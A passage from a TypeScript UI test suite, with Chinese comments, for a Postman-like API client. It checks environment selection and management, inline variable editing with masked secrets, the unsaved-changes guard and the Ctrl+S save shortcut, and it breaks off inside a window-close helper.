    fireEvent.change(screen.getByLabelText('搜索请求'), { target: { value: '我的' } });
    fireEvent.click(tree().getByLabelText('导入'));
    fireEvent.change(await screen.findByLabelText('粘贴 Postman 文档'), {
      target: { value: '{"info":{"name":"x"},"item":[]}' },
    });
    fireEvent.click(screen.getByText('导入粘贴内容'));

    await waitFor(() => expect(importPostman).toHaveBeenCalled());
    // 导入会重新拉取树，但搜索是组件内的视图态，不该被这次刷新抹掉
    await waitFor(() => expect(tree().getByText('我的集合')).toBeTruthy());
    expect((screen.getByLabelText('搜索请求') as HTMLInputElement).value).toBe('我的');
  });
});

// ---------------------------------------------------------------------------
// 环境管理与会话标签行的全局选择器（change: add-collection-search-and-env-management）
// ---------------------------------------------------------------------------

describe('环境管理与全局选择器（add-collection-search-and-env-management）', () => {
  it('侧栏激活环境会写入激活态，主区选择器同步（1.2 / 5.1）', async () => {
    const { client, environmentSetActive } = harness({ environments: [environment()] });
    render(<App client={client} />);
    await tree().findByText('我的请求');

    await openEnvironments();
    fireEvent.click(envList().getByText('测试环境'));

    // 激活态落到存储上（跨重启保留靠这条写入 + 启动时的读回）
    await waitFor(() => expect(environmentSetActive).toHaveBeenCalledWith('w1', 'e1'));
    expect((screen.getByLabelText('环境') as HTMLSelectElement).value).toBe('e1');
    expect(envList().getByText('使用中')).toBeTruthy();
  });

  it('点击 Globals 与选择「无环境」都取消激活并写入 null', async () => {
    const { client, environmentSetActive } = harness({ environments: [environment()] });
    render(<App client={client} />);
    await tree().findByText('我的请求');

    await openEnvironments();
    fireEvent.click(envList().getByText('Globals'));
    await waitFor(() => expect(environmentSetActive).toHaveBeenLastCalledWith('w1', null));
    expect((screen.getByLabelText('环境') as HTMLSelectElement).value).toBe('');

    // 再从主区选择器激活一次，然后选回「无环境」
    fireEvent.change(screen.getByLabelText('环境'), { target: { value: 'e1' } });
    await waitFor(() => expect(environmentSetActive).toHaveBeenLastCalledWith('w1', 'e1'));

    fireEvent.change(screen.getByLabelText('环境'), { target: { value: '' } });
    await waitFor(() => expect(environmentSetActive).toHaveBeenLastCalledWith('w1', null));
  });

  it('未选中任何请求时环境选择器依然可见（spec: 未选中请求时依然可见）', async () => {
    const { client } = harness({ environments: [environment()] });
    render(<App client={client} />);
    await tree().findByText('我的请求');

    expect(screen.getByText('没有打开的请求')).toBeTruthy();
    expect(screen.getByLabelText('环境')).toBeTruthy();
  });

  it('切到 Environments 编辑变量不丢已打开的请求（spec: 编辑环境变量不丢已打开的请求）', async () => {
    const { client } = harness();
    render(<App client={client} />);
    await openRequest();

    // 留一笔未保存的编辑
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    expect(await screen.findByText('未保存')).toBeTruthy();

    // 切到环境编辑器：主区让位，响应栏也随之让位（响应属于请求）
    await openEnvironments();
    expect(screen.getByTestId('environment-editor')).toBeTruthy();
    expect(screen.queryByLabelText('请求地址')).toBeNull();
    expect(document.querySelector('.response-region')).toBeNull();

    // 切回来：请求、未保存的编辑与响应栏都还在
    fireEvent.click(screen.getByRole('tab', { name: 'Collections' }));
    expect((await screen.findByLabelText('请求地址') as HTMLInputElement).value).toBe(
      'https://api.test/edited',
    );
    expect(screen.getByText('未保存')).toBeTruthy();
    expect(document.querySelector('.response-region')).toBeTruthy();
  });

  it('切换环境后解析预览与发送都带上新环境（5.3）', async () => {
    const { client, sendRequest } = harness({ environments: [environment()] });
    const previewCalls = vi.fn(async () => preview());
    client.variablesPreview = previewCalls;

    render(<App client={client} />);
    await openRequest();

    fireEvent.change(screen.getByLabelText('环境'), { target: { value: 'e1' } });

    await waitFor(() => {
      const last = previewCalls.mock.calls.at(-1)?.[0] as { environment_id: string | null };
      expect(last.environment_id).toBe('e1');
    });

    fireEvent.click(screen.getByText('发送'));
    await waitFor(() => expect(sendRequest).toHaveBeenCalled());
    expect(
      (sendRequest.mock.calls[0][0] as { environment_id: string | null }).environment_id,
    ).toBe('e1');
  });

  it('激活落库失败时回滚状态并提示（1.2）', async () => {
    const { client } = harness({ environments: [environment()] });
    client.environmentSetActive = vi.fn(async () => {
      throw { code: 'io', message: '写不进去' };
    });

    render(<App client={client} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('环境'), { target: { value: 'e1' } });

    expect((await screen.findByTestId('app-error')).textContent).toContain('写不进去');
    expect((screen.getByLabelText('环境') as HTMLSelectElement).value).toBe('');
  });

  it('激活态从存储读回，重开界面后仍是该环境（spec: 激活态跨重启保留）', async () => {
    const { client } = harness({ environments: [environment({ is_active: true })] });

    const first = render(<App client={client} />);
    await waitFor(() =>
      expect((screen.getByLabelText('环境') as HTMLSelectElement).value).toBe('e1'),
    );
    first.unmount();

    render(<App client={client} />);
    await waitFor(() =>
      expect((screen.getByLabelText('环境') as HTMLSelectElement).value).toBe('e1'),
    );
  });

  it('可以新建环境，新名称立刻可编辑（4.2 / spec: 新建环境）', async () => {
    const { client, environmentCreate } = harness();
    render(<App client={client} />);
    await tree().findByText('我的请求');
    await openEnvironments();

    fireEvent.click(screen.getByLabelText('新建环境'));

    await waitFor(() => expect(environmentCreate).toHaveBeenCalledWith('w1', '新环境'));
    const input = (await screen.findByLabelText('环境名称')) as HTMLInputElement;
    expect(input.value).toBe('新环境');
  });

  it('环境可就地重命名，空名称被拒绝并还原（4.3）', async () => {
    const { client, environmentRename } = harness({ environments: [environment()] });
    render(<App client={client} />);
    await tree().findByText('我的请求');
    await openEnvironments();

    openEnvironmentMenu('测试环境');
    fireEvent.click(screen.getByText('重命名'));
    const input = (await screen.findByLabelText('环境名称')) as HTMLInputElement;
    fireEvent.change(input, { target: { value: '预发环境' } });
    fireEvent.keyDown(input, { key: 'Enter' });

    await waitFor(() => expect(environmentRename).toHaveBeenCalledWith('e1', '预发环境'));
    expect(envList().getByText('预发环境')).toBeTruthy();

    // 空名称：拒绝、还原原值、并说明原因
    openEnvironmentMenu('预发环境');
    fireEvent.click(screen.getByText('重命名'));
    const again = (await screen.findByLabelText('环境名称')) as HTMLInputElement;
    fireEvent.change(again, { target: { value: '   ' } });
    fireEvent.keyDown(again, { key: 'Enter' });

    expect((await screen.findByTestId('env-error')).textContent).toContain('环境名称不能为空');
    expect((screen.getByLabelText('环境名称') as HTMLInputElement).value).toBe('预发环境');
    expect(environmentRename).toHaveBeenCalledTimes(1);
  });

  it('删除环境需确认；删除激活环境后回落 Globals（4.3 / 4.4）', async () => {
    const { client, environmentDelete, environmentSetActive } = harness({
      environments: [environment()],
    });
    render(<App client={client} />);
    await tree().findByText('我的请求');
    await openEnvironments();

    fireEvent.click(envList().getByText('测试环境'));
    await waitFor(() => expect(environmentSetActive).toHaveBeenCalledWith('w1', 'e1'));

    // 取消：什么都不删
    openEnvironmentMenu('测试环境');
    fireEvent.click(screen.getByText('删除'));
    const confirm = await screen.findByTestId('environment-delete-confirm');
    fireEvent.click(within(confirm).getByText('取消'));
    expect(environmentDelete).not.toHaveBeenCalled();
    expect(envList().getByText('测试环境')).toBeTruthy();

    // 确认：环境消失，激活态回落到 Globals
    openEnvironmentMenu('测试环境');
    fireEvent.click(screen.getByText('删除'));
    fireEvent.click(
      within(await screen.findByTestId('environment-delete-confirm')).getByText('删除'),
    );

    await waitFor(() => expect(environmentDelete).toHaveBeenCalledWith('e1'));
    await waitFor(() => expect(envList().queryByText('测试环境')).toBeNull());
    await waitFor(() => expect(environmentSetActive).toHaveBeenLastCalledWith('w1', null));
    expect((screen.getByLabelText('环境') as HTMLSelectElement).value).toBe('');
  });
});

// ---------------------------------------------------------------------------
// 变量值的就地编辑（change: add-variable-inline-editing）
// ---------------------------------------------------------------------------

describe('变量就地编辑（add-variable-inline-editing）', () => {
  function variableFixture(overrides: Partial<Variable> = {}): Variable {
    return {
      id: 'v-base',
      scope: 'global',
      owner_id: 'w1',
      name: 'baseUrl',
      is_secret: false,
      initial: { state: 'value', value: 'https://api.test' },
      current: { state: 'value', value: 'https://api.test' },
      ...overrides,
    };
  }

  function secretFixture(overrides: Partial<Variable> = {}): Variable {
    return variableFixture({
      id: 'v-key',
      name: 'apiKey',
      is_secret: true,
      initial: { state: 'value', value: '******' },
      current: { state: 'value', value: '******' },
      ...overrides,
    });
  }

  /** 打开 Environments：变量面板在主区（change: add-collection-search-and-env-management）。 */
  async function openVariables(client: Commands) {
    render(<App client={client} />);
    await openEnvironments();
  }

  const valueInput = (name: string) => screen.getByLabelText(`变量值 ${name}`) as HTMLInputElement;

  it('改值走 variable_set，列表刷新后显示新值（spec: 编辑非 secret 变量的值）', async () => {
    const { client, variableSet } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    const input = valueInput('baseUrl');
    expect(input.value).toBe('https://api.test');

    fireEvent.change(input, { target: { value: 'https://staging.test' } });
    fireEvent.blur(input);

    await waitFor(() => expect(variableSet).toHaveBeenCalledTimes(1));
    expect(variableSet).toHaveBeenCalledWith({
      scope: 'global',
      owner_id: 'w1',
      name: 'baseUrl',
      is_secret: false,
      initial: 'https://staging.test',
      current: 'https://staging.test',
    });
    // 外层刷新后输入框显示写进去的新值
    await waitFor(() => expect(valueInput('baseUrl').value).toBe('https://staging.test'));
  });

  it('值没变或按 Esc 都不发写请求（spec: 值没有变化时不提交）', async () => {
    const { client, variableSet } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    const input = await screen.findByLabelText('变量值 baseUrl');
    fireEvent.change(input, { target: { value: '临时改一下' } });
    fireEvent.keyDown(input, { key: 'Escape' });

    await waitFor(() => expect(valueInput('baseUrl').value).toBe('https://api.test'));

    fireEvent.blur(valueInput('baseUrl'));
    expect(variableSet).not.toHaveBeenCalled();
  });

  it('点「删除」引起的那次失焦不顺手写值（design D2）', async () => {
    const { client, variableSet, variableDelete } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    fireEvent.focus(await screen.findByLabelText('变量值 baseUrl'));
    fireEvent.click(screen.getByText('删除'));

    await waitFor(() => expect(variableDelete).toHaveBeenCalledWith('v-base'));
    expect(variableSet).not.toHaveBeenCalled();
  });

  it('提交失败时回滚并提示（spec: 提交失败时回滚并提示）', async () => {
    const { client, variableSet } = harness({ variables: [variableFixture()] });
    variableSet.mockRejectedValueOnce({ code: 'io', message: '写不进去' });
    await openVariables(client);

    const input = await screen.findByLabelText('变量值 baseUrl');
    fireEvent.change(input, { target: { value: 'https://x.test' } });
    fireEvent.blur(input);

    expect((await screen.findByTestId('variable-error')).textContent).toContain('写不进去');
    await waitFor(() => expect(valueInput('baseUrl').value).toBe('https://api.test'));
  });

  it('未揭示的 secret 保持掩码，编辑态是空输入框且留空不发请求（spec: secret 三条场景）', async () => {
    const { client, variableSet } = harness({ variables: [secretFixture()] });
    await openVariables(client);

    // 掩码可见、没有明文、也没有可编辑的输入框
    expect((await screen.findByTestId('masked-apiKey')).textContent).toBe('******');
    expect(screen.queryByText('PLAINTEXT_SECRET')).toBeNull();
    expect(screen.queryByLabelText('变量值 apiKey')).toBeNull();

    // 进入编辑态：空输入框（不是掩码文本），并说明留空的含义
    fireEvent.click(screen.getByLabelText('修改 apiKey'));
    const input = await screen.findByLabelText('变量值 apiKey');
    expect((input as HTMLInputElement).value).toBe('');
    expect(input.getAttribute('placeholder')).toContain('留空');

    // 留空失焦：不写请求，退回掩码
    fireEvent.blur(input);
    await waitFor(() => expect(screen.getByTestId('masked-apiKey')).toBeTruthy());
    expect(variableSet).not.toHaveBeenCalled();
  });

  it('已揭示的 secret 可编辑，提交后仍保持 secret 并以掩码呈现（spec: 已揭示的 secret 变量可编辑且保持 secret）', async () => {
    const secret = secretFixture();
    const revealed: Variable = {
      ...secret,
      initial: { state: 'value', value: 'PLAINTEXT_SECRET' },
      current: { state: 'value', value: 'PLAINTEXT_SECRET' },
    };
    const { client, variableSet } = harness({ variables: [secret], revealed });
    await openVariables(client);

    fireEvent.click(screen.getByText('揭示'));
    const input = await screen.findByLabelText('变量值 apiKey');
    expect((input as HTMLInputElement).value).toBe('PLAINTEXT_SECRET');

    fireEvent.change(input, { target: { value: 'ROTATED_SECRET' } });
    fireEvent.blur(input);

    await waitFor(() => expect(variableSet).toHaveBeenCalledTimes(1));
    // is_secret 必须显式带上，否则后端会把它降级成普通变量（design D3）
    expect(variableSet.mock.calls[0][0]).toMatchObject({
      name: 'apiKey',
      is_secret: true,
      current: 'ROTATED_SECRET',
    });

    // 改完重新盖回掩码：明文要看再点「揭示」
    await waitFor(() => expect(screen.getByTestId('masked-apiKey').textContent).toBe('******'));
    expect(screen.queryByText('ROTATED_SECRET')).toBeNull();
  });

  it('不可读的变量不可编辑（spec: 不可读的变量不可编辑）', async () => {
    const broken = variableFixture({
      id: 'v-broken',
      name: 'broken',
      initial: { state: 'unreadable' },
      current: { state: 'unreadable' },
    });
    const { client } = harness({ variables: [broken] });
    await openVariables(client);

    const badge = await screen.findByTestId('unreadable-broken');
    expect(badge.getAttribute('title')).toContain('密钥不可用');
    expect(screen.queryByLabelText('变量值 broken')).toBeNull();
    expect(screen.queryByLabelText('修改 broken')).toBeNull();
  });

  it('名称列保持只读（spec: 名称不可就地编辑）', async () => {
    const { client } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    const row = (await screen.findByText('baseUrl')).closest('tr') as HTMLElement;
    const textboxes = within(row).getAllByRole('textbox');
    expect(textboxes).toHaveLength(1);
    expect(textboxes[0].getAttribute('aria-label')).toBe('变量值 baseUrl');
  });

  it('幽灵行新增变量：填名称与值后失焦提交，列表出现新变量且末行回到空态（spec: 变量表通过幽灵行新增）', async () => {
    const { client, variableSet } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    // 没有「写入」按钮，只有表格末尾的空行
    expect(screen.queryByText('写入')).toBeNull();
    expect(await screen.findByLabelText('新增变量的名称')).toBeTruthy();

    fireEvent.change(screen.getByLabelText('新增变量的名称'), { target: { value: 'token' } });
    const ghostValue = screen.getByLabelText('新增变量的值');
    fireEvent.change(ghostValue, { target: { value: 'abc' } });
    fireEvent.blur(ghostValue);

    await waitFor(() => expect(variableSet).toHaveBeenCalledTimes(1));
    expect(variableSet).toHaveBeenCalledWith({
      scope: 'global',
      owner_id: 'w1',
      name: 'token',
      is_secret: false,
      initial: 'abc',
      current: 'abc',
    });

    // 列表里出现新变量，幽灵行回到空态
    await waitFor(() => expect(screen.getByText('token')).toBeTruthy());
    expect((screen.getByLabelText('新增变量的名称') as HTMLInputElement).value).toBe('');
    expect((screen.getByLabelText('新增变量的值') as HTMLInputElement).value).toBe('');
  });

  it('幽灵行的名称是新增入口：提交走 variable_set 的 upsert，不是改名', async () => {
    const { client, variableSet } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    const name = (await screen.findByLabelText('新增变量的名称')) as HTMLInputElement;
    fireEvent.change(name, { target: { value: 'baseUrl' } });
    fireEvent.blur(name);

    await waitFor(() => expect(variableSet).toHaveBeenCalledTimes(1));
    // 定位键仍是「作用域 + 归属 + 名称」，id 与 secret 标记不由这里改动
    expect(variableSet.mock.calls[0][0]).toMatchObject({
      scope: 'global',
      owner_id: 'w1',
      name: 'baseUrl',
      is_secret: false,
    });
  });

  it('幽灵行没填名称就离开不发写请求（spec: 空名称不提交）', async () => {
    const { client, variableSet } = harness({ variables: [variableFixture()] });
    await openVariables(client);

    const ghostValue = await screen.findByLabelText('新增变量的值');
    fireEvent.change(ghostValue, { target: { value: '只有值没有名字' } });
    fireEvent.blur(ghostValue);

    expect(variableSet).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// 幽灵行与出口清洗（change: reduce-explicit-save-and-add-controls）
// ---------------------------------------------------------------------------

describe('空行不进请求与保存（出口清洗）', () => {
  /** 在参数表里造一个「写了又清空」的行：它留在模型里，但出口应当把它剔掉。 */
  function leaveAnEmptyRow() {
    const ghost = screen.getByLabelText('新增行的名称');
    fireEvent.change(ghost, { target: { value: '待清空' } });
    fireEvent.change(ghost, { target: { value: '' } });
  }

  it('发送时剔掉空行（spec: 未输入的幽灵行不进入请求）', async () => {
    const { client, sendRequest, variablesPreview } = harness();
    render(<App client={client} />);
    await openRequest();

    // 先弄脏：不脏的话走的是 saved_id，压根不带 inline
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');
    leaveAnEmptyRow();

    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalledTimes(1));
    expect(sendRequest.mock.calls[0][0]).toMatchObject({
      saved_id: null,
      inline: expect.objectContaining({ params: [] }),
    });

    // 解析预览走同一份清洗
    await waitFor(() => expect(variablesPreview).toHaveBeenCalled());
    const previewInput = variablesPreview.mock.calls.at(-1)?.[0] as {
      inline: SavedRequest | null;
    };
    expect(previewInput.inline?.params).toEqual([]);
  });

  it('保存时剔掉空行（spec: 空行不被保存）', async () => {
    const { client, requestSave } = harness();
    render(<App client={client} />);
    await openRequest();

    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');
    leaveAnEmptyRow();

    fireEvent.click(screen.getByTestId('save-request'));

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
    expect(requestSave.mock.calls[0][0].params).toEqual([]);
  });

  it('打开此前存有空行的请求：表格只有内容行加一个幽灵行', async () => {
    const { client } = harness({
      request: makeRequest({
        params: [
          { key: '', value: '', enabled: true },
          { key: 'q', value: '1', enabled: true },
        ],
      }),
    });
    render(<App client={client} />);
    await openRequest();

    const rows = Array.from(document.querySelectorAll('.request-editor tbody tr'));
    expect(rows).toHaveLength(2);
    expect((screen.getByLabelText('参数名 0') as HTMLInputElement).value).toBe('q');
    expect(rows[1].className).toContain('ghost-row');
  });
});

describe('保存入口（spec: 面包屑与请求操作行）', () => {
  it('未改动时没有保存按钮，改动后与未保存标记同时出现，保存后一并消失', async () => {
    const { client, requestSave } = harness();
    render(<App client={client} />);
    await openRequest();

    expect(screen.queryByTestId('save-request')).toBeNull();
    expect(screen.queryByText('未保存')).toBeNull();
    // 另存为 / 删除照旧常驻
    expect(screen.getByText('另存为')).toBeTruthy();
    expect(screen.getByText('删除')).toBeTruthy();

    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });

    const save = await screen.findByTestId('save-request');
    expect(screen.getByText('未保存')).toBeTruthy();
    // 入口自己说明等价的键盘操作
    expect(save.getAttribute('title')).toContain('Ctrl+S');

    fireEvent.click(save);

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
    await waitFor(() => expect(screen.queryByTestId('save-request')).toBeNull());
    expect(screen.queryByText('未保存')).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// 未保存改动在切走前的守卫（change: reduce-explicit-save-and-add-controls）
// ---------------------------------------------------------------------------

describe('未保存守卫', () => {
  const other = makeRequest({
    id: 'r2',
    name: '另一个请求',
    url: 'https://api.test/other',
  });

  /** 打开请求并制造一笔未保存的改动。 */
  async function openDirty(client: Commands) {
    render(<App client={client} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');
  }

  const guard = () => screen.queryByTestId('unsaved-guard');
  const currentUrl = () => (screen.getByLabelText('请求地址') as HTMLInputElement).value;

  it('切换到另一个请求先询问，选择前不切换主区', async () => {
    const { client } = harness({ extraRequest: other });
    await openDirty(client);

    fireEvent.click(tree().getByText('另一个请求'));

    expect(guard()).toBeTruthy();
    expect(currentUrl()).toBe('https://api.test/edited');
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('选择不保存后继续，改动被丢弃', async () => {
    const { client } = harness({ extraRequest: other });
    await openDirty(client);

    fireEvent.click(tree().getByText('另一个请求'));
    fireEvent.click(screen.getByText('不保存'));

    await waitFor(() => expect(currentUrl()).toBe('https://api.test/other'));
    expect(guard()).toBeNull();
    expect(screen.queryByText('未保存')).toBeNull();
  });

  it('取消后停在原地', async () => {
    const { client } = harness({ extraRequest: other });
    await openDirty(client);

    fireEvent.click(tree().getByText('另一个请求'));
    fireEvent.click(screen.getByText('取消'));

    await waitFor(() => expect(guard()).toBeNull());
    expect(currentUrl()).toBe('https://api.test/edited');
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('保存并继续：先落库再执行原操作', async () => {
    const { client, requestSave } = harness({ extraRequest: other });
    await openDirty(client);

    fireEvent.click(tree().getByText('另一个请求'));
    fireEvent.click(screen.getByText('保存并继续'));

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
    expect(requestSave.mock.calls[0][0].url).toBe('https://api.test/edited');
    await waitFor(() => expect(currentUrl()).toBe('https://api.test/other'));
    expect(guard()).toBeNull();
  });

  it('保存失败则不继续，并停在原地报错', async () => {
    const { client, requestSave } = harness({ extraRequest: other });
    requestSave.mockRejectedValueOnce({ code: 'io', message: '写不进去' });
    await openDirty(client);

    fireEvent.click(tree().getByText('另一个请求'));
    fireEvent.click(screen.getByText('保存并继续'));

    await waitFor(() =>
      expect(screen.getByTestId('app-error').textContent).toContain('写不进去'),
    );
    expect(currentUrl()).toBe('https://api.test/edited');
    expect(screen.getByText('未保存')).toBeTruthy();
    expect(guard()).toBeNull();
  });

  it('关闭会话标签先询问', async () => {
    const { client } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByLabelText('关闭标签'));

    expect(guard()).toBeTruthy();
    expect(screen.getByLabelText('请求地址')).toBeTruthy();

    fireEvent.click(screen.getByText('不保存'));
    await waitFor(() => expect(screen.queryByLabelText('请求地址')).toBeNull());
  });

  it('删除当前打开的请求先询问', async () => {
    const { client } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByText('删除'));

    expect(guard()).toBeTruthy();
    expect(screen.getByLabelText('请求地址')).toBeTruthy();

    fireEvent.click(screen.getByText('取消'));
    await waitFor(() => expect(guard()).toBeNull());
    expect(screen.getByLabelText('请求地址')).toBeTruthy();
  });

  it('重复选中当前请求不询问也不清除标记', async () => {
    const { client } = harness();
    await openDirty(client);

    fireEvent.click(tree().getByText('我的请求'));

    expect(guard()).toBeNull();
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('没有未保存改动时不打断', async () => {
    const { client } = harness({ extraRequest: other });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(tree().getByText('另一个请求'));

    expect(guard()).toBeNull();
    await waitFor(() => expect(currentUrl()).toBe('https://api.test/other'));
  });
});

describe('守卫不该打扰的路径', () => {
  const guard = () => screen.queryByTestId('unsaved-guard');

  async function openDirty(client: Commands) {
    render(<App client={client} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');
  }

  it('切换侧栏 tab 不询问，切回后草稿仍在', async () => {
    const { client } = harness();
    await openDirty(client);

    await openEnvironments();
    expect(guard()).toBeNull();

    fireEvent.click(screen.getByRole('tab', { name: 'Collections' }));
    expect((await screen.findByLabelText('请求地址') as HTMLInputElement).value).toBe(
      'https://api.test/edited',
    );
    expect(guard()).toBeNull();
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('切换脚本相位不询问，另一段内容保留', async () => {
    const { client } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByText('Scripts'));
    fireEvent.change(await screen.findByLabelText('前置脚本'), {
      target: { value: 'console.log("pre");' },
    });

    fireEvent.click(screen.getByText('Post-response'));
    expect(guard()).toBeNull();

    fireEvent.click(screen.getByText('Pre-request'));
    const pre = (await screen.findByLabelText('前置脚本')) as HTMLTextAreaElement;
    expect(pre.value).toBe('console.log("pre");');
  });

  it('切换激活环境不询问', async () => {
    const { client } = harness({ environments: [environment()] });
    await openDirty(client);

    fireEvent.change(screen.getByLabelText('环境'), { target: { value: 'e1' } });

    expect(guard()).toBeNull();
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('发送请求不询问', async () => {
    const { client, sendRequest } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalledTimes(1));
    expect(guard()).toBeNull();
  });

  it('打开与关闭模态不询问', async () => {
    const { client } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByText('设置'));
    expect(guard()).toBeNull();
    expect(await screen.findByTestId('settings-panel')).toBeTruthy();

    fireEvent.keyDown(window, { key: 'Escape' });
    await waitFor(() => expect(screen.queryByTestId('settings-panel')).toBeNull());
    expect(guard()).toBeNull();
    expect(screen.getByText('未保存')).toBeTruthy();
  });
});

// ---------------------------------------------------------------------------
// Ctrl+S 保存当前编辑面（change: reduce-explicit-save-and-add-controls）
// ---------------------------------------------------------------------------

describe('Ctrl+S', () => {
  /** 手动放行的 Promise：用来卡住一次保存，验证「不重复提交」。 */
  function deferred<T>() {
    let resolve!: (value: T) => void;
    const promise = new Promise<T>((res) => {
      resolve = res;
    });
    return { promise, resolve };
  }

  const variableFixture: Variable = {
    id: 'v-base',
    scope: 'global',
    owner_id: 'w1',
    name: 'baseUrl',
    is_secret: false,
    initial: { state: 'value', value: 'https://api.test' },
    current: { state: 'value', value: 'https://api.test' },
  };

  async function openDirty(client: Commands) {
    render(<App client={client} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');
  }

  const pressSave = (init: KeyboardEventInit = { ctrlKey: true }) =>
    fireEvent.keyDown(window, { key: 's', ...init });

  it('保存当前请求，未保存标记随之消失', async () => {
    const { client, requestSave } = harness();
    await openDirty(client);

    pressSave();

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
    await waitFor(() => expect(screen.queryByText('未保存')).toBeNull());
  });

  it('焦点在输入框内同样生效，并拦掉运行环境自己的保存动作', async () => {
    const { client, requestSave } = harness();
    await openDirty(client);

    const url = screen.getByLabelText('请求地址');
    url.focus();
    // fireEvent 返回 false 即默认行为已被 preventDefault 拦下
    const notPrevented = fireEvent.keyDown(url, { key: 's', ctrlKey: true });
    expect(notPrevented).toBe(false);

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
  });

  it('macOS 上的 Cmd+S 行为一致', async () => {
    const { client, requestSave } = harness();
    await openDirty(client);

    pressSave({ metaKey: true });

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
  });

  it('没有改动时不发任何写请求', async () => {
    const { client, requestSave } = harness();
    render(<App client={client} />);
    await openRequest();

    pressSave();

    expect(requestSave).not.toHaveBeenCalled();
  });

  it('一次保存尚未结束时再次按下不重复提交', async () => {
    const { client, requestSave } = harness();
    const gate = deferred<SavedRequest>();
    requestSave.mockReturnValueOnce(gate.promise);
    await openDirty(client);

    pressSave();
    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));

    // 这一次保存在 gate 上还没结束，再按一次不该产生第二次写请求
    pressSave();
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(requestSave).toHaveBeenCalledTimes(1);

    gate.resolve(makeRequest({ id: 'r1', url: 'https://api.test/edited' }));
    await waitFor(() => expect(screen.queryByText('未保存')).toBeNull());
  });

  it('保存失败时保留未保存标记', async () => {
    const { client, requestSave } = harness();
    requestSave.mockRejectedValueOnce({ code: 'io', message: '写不进去' });
    await openDirty(client);

    pressSave();

    await waitFor(() =>
      expect(screen.getByTestId('app-error').textContent).toContain('写不进去'),
    );
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('只保存当前生效的编辑面：模态打开时保存模态，主区请求不受影响', async () => {
    const { client, settingsSet, requestSave } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByText('设置'));
    await screen.findByTestId('settings-panel');
    fireEvent.change(screen.getByLabelText('主机名单'), { target: { value: 'api.test' } });

    pressSave();

    await waitFor(() =>
      expect(settingsSet).toHaveBeenCalledWith(
        'script_send_request',
        'policy',
        expect.any(String),
      ),
    );
    expect(requestSave).not.toHaveBeenCalled();
  });

  it('主区让给环境编辑器时不越权保存那个请求，也不在即时提交的界面产生副作用', async () => {
    const { client, requestSave, variableSet } = harness({ variables: [variableFixture] });
    await openDirty(client);

    await openEnvironments();
    pressSave();

    // 变量面板是即写即提交的，没有「保存」这一说
    expect(requestSave).not.toHaveBeenCalled();
    expect(variableSet).not.toHaveBeenCalled();

    // 它只是不是「当前面」，不是被丢弃
    fireEvent.click(screen.getByRole('tab', { name: 'Collections' }));
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('打开没有保存概念的模态时，快捷键不产生任何副作用', async () => {
    const { client, requestSave, cookiePut } = harness();
    await openDirty(client);

    fireEvent.click(screen.getByText('Cookie'));
    await screen.findByTestId('cookie-panel');

    pressSave();

    expect(requestSave).not.toHaveBeenCalled();
    expect(cookiePut).not.toHaveBeenCalled();
  });

  it('集合/文件夹脚本面板同样是可以被快捷键保存的编辑面', async () => {
    const { client, folderSetScript } = harness({ folder: makeFolder() });
    render(<App client={client} />);
    await tree().findByText('我的文件夹');
    fireEvent.click(tree().getByText('我的文件夹'));
    fireEvent.change(await screen.findByLabelText('文件夹前置脚本'), {
      target: { value: 'console.log("folder");' },
    });

    pressSave();

    await waitFor(() =>
      expect(folderSetScript).toHaveBeenCalledWith('f1', 'console.log("folder");', null),
    );
  });
});

// ---------------------------------------------------------------------------
// 退出应用前的未保存处置（change: reduce-explicit-save-and-add-controls）
// ---------------------------------------------------------------------------

describe('退出应用前的未保存处置', () => {
  /**
   * 假窗口控制口：抓住 App 挂上的关闭回调，测试里模拟「用户点了窗口关闭」。
   * 回调的返回值就是「这次关闭是否被允许」。其余窗口方法补 no-op——
   * App 挂载即查询 / 订阅最大化状态，缺了它们会直接崩。
   */
  function fakeWindow() {
    let handler: (() => Promise<boolean>) | null = null;
    const closer = {
      onCloseRequested: async (next: () => Promise<boolean>) => {
        handler = next;
        return () => {
